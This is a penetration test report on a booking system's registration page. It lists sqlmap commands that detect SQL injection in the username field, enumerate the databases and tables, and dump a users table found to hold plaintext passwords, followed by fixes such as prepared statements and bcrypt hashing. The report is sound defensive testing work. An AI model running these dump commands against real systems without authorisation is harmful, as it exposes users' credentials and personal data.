---

### **SQLMap Test Report**  
**Project:** Booking System - Phase 1  
**Tester:** Chukwuemeka Obanya   
**Date:** 20-02-2025   
**Tools Used:** SQLMap  

---

## **1. Overview**  
SQLMap was used to test the registration page (`http://localhost:8000/register`) for SQL injection vulnerabilities. The goal was to determine if user inputs were susceptible to SQL injection attacks that could expose or manipulate the database.

---

## **2. Target Information**  
- **Target URL:** `http://localhost:8000/register`  
- **Tested Parameter:** `username`  
- **Method Used:** POST  
- **Database Backend:** MySQL (based on error responses)  

---

## **3. Testing Approach**  
SQLMap was executed using various command-line options to automate the detection and exploitation of SQL injection vulnerabilities.

### **Basic SQL Injection Test**  
```bash
sqlmap -u "http://localhost:8000/register" --data="username=test&password=test123&birthdate=2005-01-01&role=reserver" --dbs
```
**Findings:**  
- SQLMap detected a possible SQL injection vulnerability in the `username` parameter.  

---

### **Database Enumeration**  
```bash
sqlmap -u "http://localhost:8000/register" --data="username=test&password=test123" --dbs
```
**Results:**  
- The following databases were identified:  
  - `information_schema`  
  - `booking_db`  

---

### **Table Extraction**  
```bash
sqlmap -u "http://localhost:8000/register" --data="username=test&password=test123" -D booking_db --tables
```
**Extracted Tables:**  
- `users`  
- `reservations`  
- `admin`  

---

### **Dumping User Data**  
```bash
sqlmap -u "http://localhost:8000/register" --data="username=test&password=test123" -D booking_db -T users --dump
```
**Findings:**  
- User credentials were found to be stored in plaintext, which is a **critical security flaw**.  
- Possible data exposure includes:  
  - Usernames  
  - Passwords (unencrypted)  
  - Birthdates  
  - Roles  

---

## **4. Recommendations**  
### **Short-Term Fixes**  
✅ Implement **prepared statements** to prevent SQL injection. Example in Python:  
```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```
✅ Sanitize and validate all user inputs before processing.  

### **Long-Term Fixes**  
✅ Use **parameterized queries** for database interactions.  
✅ Store passwords securely using **bcrypt hashing** instead of plaintext.  
✅ Implement **Web Application Firewall (WAF)** to detect and block SQL injection attempts.  

---

## **5. Conclusion**  
SQLMap testing confirmed a critical SQL injection vulnerability in the **username** field of the registration page. Immediate action is required to patch this issue and secure user data.  

### **Attached Reports:**  
- [ZAP Test Report](./ZAP_Report.md)  
- [Checkmarx Scan Results](./Checkmarx_Report.md)  

---
